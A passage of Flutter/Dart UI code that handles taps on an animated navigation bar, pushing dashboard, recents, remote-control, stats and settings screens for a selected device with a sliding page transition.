        animationDuration: const Duration(milliseconds: 800),
        onTap: (index) {
          Navigator.push(
            context,
            PageRouteBuilder(
              pageBuilder: (context, animation, secondaryAnimation) {
                switch (index) {
                  case 0:
                    return DashboardScreen();
                  case 1:
                    return RecentsScreen(selectedDevice: widget.selectedDevice);
                  case 2:
                    return RemoteControlScreen(
                        selectedDevice: widget.selectedDevice);
                  case 3:
                    return AdvancedStatsScreen(
                        selectedDevice: widget.selectedDevice);
                  case 4:
                    return SettingsScreen(
                        selectedDevice: widget.selectedDevice);
                  default:
                    return DashboardScreen();
                }
              },
              transitionsBuilder:
                  (context, animation, secondaryAnimation, child) {
                const begin = Offset(1.0, 0.0);
                const end = Offset.zero;
                const curve = Curves.easeInOutCubic;

                var tween = Tween(begin: begin, end: end)
                    .chain(CurveTween(curve: curve));

                return SlideTransition(
                  position: animation.drive(tween),
                  child: child,
                );
              },
            ),
          );
        },
        letIndexChange: (index) => true,
      ),
    );
  }
}
